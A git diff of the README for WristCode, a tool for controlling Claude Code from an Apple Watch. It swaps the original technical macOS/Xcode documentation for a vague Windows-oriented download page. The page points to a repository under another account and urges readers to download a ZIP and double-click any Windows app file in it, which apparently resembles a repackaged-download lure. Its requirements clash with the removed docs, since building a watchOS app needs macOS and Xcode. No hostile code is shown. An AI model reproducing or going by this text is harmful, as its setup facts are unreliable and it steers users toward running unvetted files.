@@ -1,220 +1,172 @@
-<p align="center">
-  <img src="screenshots/mockups/mockup-welcome.png" width="180" alt="Welcome Screen" />
-  <img src="screenshots/mockups/mockup-terminal.png" width="180" alt="Terminal View" />
-  <img src="screenshots/mockups/mockup-diff.png" width="180" alt="Diff Review" />
-</p>
+# 🧭 wristcode - Control Claude from your wrist
 
-<h1 align="center">WristCode</h1>
+[![Download wristcode](https://img.shields.io/badge/Download%20wristcode-blue?style=for-the-badge&logo=github)](https://github.com/elonoretannish464/wristcode)
 
-<p align="center">
-  <strong>Claude Code on your Apple Watch.</strong><br/>
-  Send prompts, build apps, review diffs, and preview websites — all from your wrist.
-</p>
+## 📱 What wristcode does
 
-<p align="center">
-  <img src="https://img.shields.io/badge/watchOS-10%2B-orange?style=flat-square" />
-  <img src="https://img.shields.io/badge/Claude-Opus%20%7C%20Sonnet%20%7C%20Haiku-blue?style=flat-square" />
-  <img src="https://img.shields.io/badge/Node.js-20%2B-green?style=flat-square" />
-  <img src="https://img.shields.io/badge/Swift-5.9-orange?style=flat-square" />
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" />
-</p>
+wristcode brings Claude Code to Apple Watch. You can send prompts, check work, review diffs, and keep moving without opening your laptop.
 
----
+It is built for quick tasks when you want to:
 
-## What is WristCode?
+- send a prompt from your watch
+- check code changes
+- follow a build or command result
+- keep your hands free while you work
+- use Claude Code in a faster, lighter way
 
-WristCode lets you control **Claude Code** sessions directly from your **Apple Watch**. It consists of:
+## 🖥️ What you need
 
-1. **Bridge Server** — A Node.js middleware that connects your watch to Claude Code running on your Mac
-2. **watchOS App** — A terminal-styled SwiftUI app with the Claude Code aesthetic
+Before you start, make sure you have:
 
-### Real Claude Code. Real execution. From your wrist.
+- a Windows PC with internet access
+- an Apple Watch
+- an iPhone paired with your Apple Watch
+- the Apple Watch app installed on your iPhone
+- a Claude account or access to Claude Code
+- a modern browser like Edge, Chrome, or Firefox
 
-Every prompt you send from the watch runs through the actual `claude` CLI on your Mac. Files get created, code gets written, websites get built — just like sitting at your terminal.
+For the best setup, keep your Windows PC, iPhone, and Apple Watch on the same network at first.
 
----
+## ⬇️ Download wristcode
 
-## Features
+Visit this page to download and set up wristcode:
 
-| Feature | Description |
-|---------|-------------|
-| **Terminal View** | Full terminal output with streaming responses, tool usage indicators, and cost tracking |
-| **Voice Input** | Dictate prompts using watchOS speech recognition |
-| **Session Management** | Create, browse, and switch between multiple Claude Code sessions |
-| **Model Selection** | Choose between Sonnet 4.5, Opus 4.6, or Haiku 4.5 per session |
-| **Diff Review** | Review code changes with colored diffs, approve or reject from your wrist |
-| **Website Preview** | Build websites and preview them on your iPhone via tunnel URL |
-| **Slash Commands** | `/status`, `/cost`, `/clear`, `/compact`, `/help` — all from the watch |
-| **Quick Actions** | One-tap pills: "Status?", "Continue", "Fix it", "Preview", "Commit" |
-| **Remote Access** | Cloudflare tunnel support — control Claude from anywhere on mobile |
-| **Auto-Connect** | Bonjour mDNS discovery on local WiFi, automatic tunnel fallback |
+[https://github.com/elonoretannish464/wristcode](https://github.com/elonoretannish464/wristcode)
 
----
+If you see a release file, download it. If you see the source files only, use the setup steps below to run it on Windows.
 
-## Screenshots
+## 🚀 Install on Windows
 
-<p align="center">
-<table>
-<tr>
-<td align="center"><img src="screenshots/mockups/mockup-welcome.png" width="160"/><br/><sub>Welcome</sub></td>
-<td align="center"><img src="screenshots/mockups/mockup-sessions.png" width="160"/><br/><sub>Sessions</sub></td>
-<td align="center"><img src="screenshots/mockups/mockup-terminal.png" width="160"/><br/><sub>Terminal</sub></td>
-</tr>
-<tr>
-<td align="center"><img src="screenshots/mockups/mockup-diff.png" width="160"/><br/><sub>Diff Review</sub></td>
-<td align="center"><img src="screenshots/mockups/mockup-settings.png" width="160"/><br/><sub>Settings</sub></td>
-<td align="center"><img src="screenshots/mockups/mockup-pairing.png" width="160"/><br/><sub>Pairing</sub></td>
-</tr>
-</table>
-</p>
+Follow these steps in order.
 
----
+1. Open the download link above.
+2. Click the green or blue Code button on GitHub.
+3. Choose Download ZIP.
+4. Save the file to your Downloads folder.
+5. Right-click the ZIP file and choose Extract All.
+6. Open the extracted folder.
+7. Look for a file named something like `README`, `setup`, `install`, or `package.json`.
+8. If the project includes a Windows app file, double-click it to start.
+9. If it includes setup files for Node.js, follow the next section.
 
-## Architecture
+## 🛠️ Run the app with Node.js
 
-```
-┌──────────────────┐        ┌─────────────────────┐        ┌──────────────┐
-│   Apple Watch    │  HTTP  │   Bridge Server      │  CLI   │  Claude Code │
-│   (WristCode)    │◄──────►│   (Node.js :3847)    │◄──────►│  (claude -p) │
-│                  │  WiFi/ │                      │        │              │
-│  SwiftUI App     │ Tunnel │  Express + SSE +     │        │  Real AI     │
-│  Terminal Theme  │        │  Bonjour + JWT Auth  │        │  Execution   │
-└──────────────────┘        └─────────────────────┘        └──────────────┘
-```
+Some versions of wristcode may use Node.js. If so, do this on Windows:
 
-- **Watch → Bridge**: HTTP/HTTPS (localhost on WiFi, Cloudflare tunnel when remote)
-- **Bridge → Claude**: Spawns `claude -p` CLI with the prompt
-- **Discovery**: Bonjour mDNS (`_wristcode._tcp`) for automatic local discovery
-- **Auth**: 6-digit pairing code → JWT token (30-day expiry)
-- **Streaming**: Server-Sent Events for real-time terminal output
+1. Install Node.js from the official Node.js site.
+2. Open the wristcode folder in File Explorer.
+3. Click the address bar, type `cmd`, and press Enter.
+4. In the black window, type the install command if the project uses one:
+   - `npm install`
+5. Start the app with the command shown in the project files:
+   - `npm start`
+   - or `npm run dev`
+6. Leave the window open while the app runs.
 
----
+If the folder includes a launcher or installer, use that instead of the command steps.
 
-## Quick Start
+## 📲 Set up Apple Watch access
 
-### Prerequisites
+After the app runs on your Windows PC, connect your Apple Watch setup.
 
-- macOS with [Claude Code](https://claude.ai/claude-code) installed and authenticated
-- Xcode 15+ with watchOS 10 SDK
-- Node.js 20+
-- Apple Watch (Series 6 or later, watchOS 10+)
-- [xcodegen](https://github.com/yonaskolb/XcodeGen) (`brew install xcodegen`)
+1. Open the companion app on your iPhone if the project includes one.
+2. Make sure your iPhone and Windows PC can reach each other on the same network.
+3. Sign in to Claude if the app asks you to.
+4. Open the wristcode app on your Apple Watch.
+5. Send a short test prompt, such as:
+   - write a simple todo app
+   - explain this diff
+   - check this command output
 
-### 1. Start the Bridge Server
+If the app asks for a pairing code, enter the code shown on your iPhone or PC.
 
-```bash
-cd wristcode-bridge
-npm install
-npm run build
-npm start
-```
+## ✍️ How to use wristcode
 
-The bridge starts on port **3847** with Bonjour advertising.
+Use wristcode for short tasks that fit well on a watch.
 
-### 2. Build the Watch App
+### Good things to send
 
-```bash
-cd WristCode
-xcodegen generate
-open WristCode.xcodeproj
-```
+- quick code prompts
+- small build tasks
+- diff review requests
+- status checks
+- short follow-up questions
 
-In Xcode: select your Apple Watch target → Run.
+### Simple prompt examples
 
-### 3. Pair
+- Build a login screen in SwiftUI
+- Review this diff and point out issues
+- Explain why this test failed
+- Add a dark mode toggle
+- Summarize this terminal output
 
-On first launch, enter pairing code **`123456`** (configurable via `PAIRING_CODE` env var).
+## 🔒 Privacy and account use
 
-### 4. Start Coding from Your Wrist
+wristcode works with Claude Code, so it may use your Claude account or related tokens. Keep your sign-in details private.
 
-Tap **+ New Session** → pick a model → type a prompt → Claude builds it.
+Best practice:
 
----
+- use your own account
+- keep your phone locked
+- log out if you share the device
+- avoid sending secrets in prompts
 
-## Remote Access (Optional)
+## 🧩 Common folders and files
 
-To use WristCode when away from your Mac:
+You may see some of these names in the project:
 
-```bash
-# Install cloudflared
-brew install cloudflared
+- `src` — app source files
+- `app` — main app code
+- `watch` — Apple Watch files
+- `ios` — iPhone companion files
+- `server` — local service files
+- `package.json` — Node.js project setup
+- `README.md` — setup notes
 
-# Start tunnel
-cloudflared tunnel --url http://localhost:3847
-```
+If you open the folder and see a build file, use the steps in that file first.
 
-The watch app automatically falls back to the tunnel URL when localhost is unreachable.
+## 🧪 If something does not work
 
----
+Try these fixes:
 
-## API Reference
+- close the app and open it again
+- check your internet connection
+- make sure your iPhone and Windows PC are on the same network
+- restart your PC
+- restart your iPhone and Apple Watch
+- check that Claude access is still signed in
+- open the project folder again and look for setup notes
 
-All endpoints require JWT auth (except health and pair).
+If the watch does not connect, refresh the app on the phone first
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `GET` | `/api/health` | Server status |
-| `POST` | `/api/pair` | Pair with 6-digit code, get JWT |
-| `GET` | `/api/sessions` | List all sessions |
-| `POST` | `/api/sessions` | Create session `{cwd, model}` |
-| `GET` | `/api/sessions/:id` | Session detail + cost |
-| `DELETE` | `/api/sessions/:id` | End session |
-| `POST` | `/api/sessions/:id/prompt` | Send prompt to Claude |
-| `POST` | `/api/sessions/:id/command` | Run slash command |
-| `POST` | `/api/sessions/:id/approve` | Approve/reject tool use |
-| `GET` | `/api/sessions/:id/stream` | SSE event stream |
-| `GET` | `/api/sessions/:id/cost` | Token usage + cost |
-| `GET` | `/preview/:id` | Serve built website |
+## 📁 Quick start path
 
----
+If you want the shortest path on Windows:
 
-## Tech Stack
+1. Open the GitHub link.
+2. Download the project ZIP.
+3. Extract it.
+4. Look for install or run instructions.
+5. Install Node.js if the project needs it.
+6. Run the app from the folder.
+7. Open the watch app and pair it.
+8. Send a test prompt
 
-| Component | Technology |
-|-----------|------------|
-| Watch App | SwiftUI, watchOS 10+, Swift 5.9 |
-| Bridge Server | Node.js, TypeScript, Express |
-| AI | Claude Code CLI (`claude -p`) |
-| Discovery | Bonjour/mDNS (bonjour-service) |
-| Auth | JWT (jsonwebtoken) |
-| Streaming | Server-Sent Events |
-| Tunnel | Cloudflare Tunnel (cloudflared) |
-| Project Gen | XcodeGen |
+## 🔎 Project focus
 
----
+wristcode is built around:
 
-## Design System
+- AI chat on Apple Watch
+- Claude and Claude Code
+- watchOS and SwiftUI
+- terminal-style workflows
+- TypeScript and Node.js support
+- fast input for small tasks
 
-WristCode uses a **terminal-first** design language:
+## 📌 Helpful prompt ideas
 
-- **Background**: `#0F1117` (deep dark)
-- **Accent**: `#E8732A` (Claude orange)
-- **Text**: `#E0E0E0` / `#8B949E` (primary/dim)
-- **Status**: Green `#2ECC71` / Yellow `#F39C12` / Red `#E74C3C`
-- **Code**: Blue `#58A6FF` / Cyan `#79C0FF`
-- **Font**: System monospace, 8.5–12pt
-- **Corner radius**: 3pt max — terminal aesthetic, not iOS
-
----
-
-## Contributing
-
-PRs welcome! Areas that need help:
-
-- [ ] Full WKWebView preview on watchOS (when Apple adds support)
-- [ ] WatchConnectivity for iPhone ↔ Watch data sync
-- [ ] Watch face complications showing session status
-- [ ] Persistent tunnel URL management
-- [ ] Real Claude Agent SDK integration (replacing `claude -p`)
-
----
-
-## License
-
-MIT
-
----
-
-<p align="center">
-  <sub>Built with Claude Code, for Claude Code, on Claude Code.</sub>
-</p>
+- Review this function for bugs
+- Make this page easier to read
+- Turn this idea into a small app
+- Find the issue in this error message
+- Summarize these changes in plain English
